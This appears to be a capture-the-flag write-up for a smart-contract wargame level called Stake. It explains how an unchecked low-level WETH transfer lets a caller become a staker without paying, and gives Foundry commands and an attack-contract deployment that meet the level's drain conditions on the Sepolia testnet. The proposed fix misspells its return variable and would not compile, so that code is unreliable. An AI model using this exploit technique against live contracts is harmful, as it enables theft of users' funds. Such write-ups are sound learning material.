# Stake

Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?

To complete this level, the contract state must meet the following conditions:

* The Stake contract's ETH balance has to be greater than 0.
* totalStaked must be greater than the Stake contract's ETH balance.
* You must be a staker.
* Your staked balance must be 0.

[ERC-20 specification](https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md)

[OpenZeppelin contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)


## Vulnerability

### You must be a staker.

```bash
function StakeWETH(uint256 amount) public returns (bool){
    require(amount >  0.001 ether, "Don't be cheap");
    (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
    require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
    totalStaked += amount;
    UserStake[msg.sender] += amount;
    (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
    Stakers[msg.sender] = true;
    return transfered;
}
```

`StakeWETH` incorrectly handles the result of a low-level call to the `WETH` contract for transferring tokens. Specifically, the function attempts to transfer `WETH` tokens from the caller to the contract itself and sets the caller as a `staker` regardless of whether the transfer was successful.

1. `Low-level call handling`: The function uses a low-level call to interact with the `WETH` contract. Low-level calls do not automatically revert the transaction when the called contract function fails. Instead, they return a boolean value indicating success (`true`) or failure (`false`).
2. `Incorrect success check`: After making the low-level call, the function checks the first return value (`transferred`) to determine if the call was successful. However, it does not properly handle the case when transferred is `false`. The absence of a require statement or similar check means that even if the transfer fails the function proceeds as if the transfer succeeded.
3. `Unconditional staker status assignment`: Regardless of the transfer's outcome, the function marks the caller as a `staker` by setting `Stakers[msg.sender] = true`;. This means a caller can become a staker without actually transferring any WETH tokens to the contract, as long as they call `StakeWETH`.
4. `Security and logical flaw`: This oversight is a significant security and logical flaw. It allows anyone to become a staker without fulfilling the intended requirement of transferring `WETH` tokens to the contract. This could lead to unintended consequences in the contract's logic and potentially exploit the staking mechanism.

## Attack

1.  You must be a `staker` and your staked balance must be 0.

```bash
cast send $STAKE_CONTRACT_ADDRESS "StakeETH()" --value 0.001000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

cast send $STAKE_CONTRACT_ADDRESS "Unstake(uint256)" "0.001000000000000001 ether" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

# https://sepolia.etherscan.io/address/0x07C02666f37ac5E5F5247CA6265641d0a6d10A1a
```

2. The `Stake` contract's ETH balance has to be greater than 0 and `totalStaked` must be greater than `Stake` contract's ETH balance.

```bash
forge script script/DeployStakeAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# make deploy ARGS="--network sepolia"
# https://sepolia.etherscan.io/address/0x77881d44AC281Fa6A304C204FD07163a940c9710

cast send $CONTRACT_ADDRESS "attack()" --value 0.001000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
```

## Fix

```bash
function StakeWETH(uint256 amount) public returns (bool){
    require(amount >  0.001 ether, "Don't be cheap");
    (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
    require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
    totalStaked += amount;
    UserStake[msg.sender] += amount;
    (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
    require(transferred, "WETH transfer failed");
    Stakers[msg.sender] = true;
    return transfered;
}
```
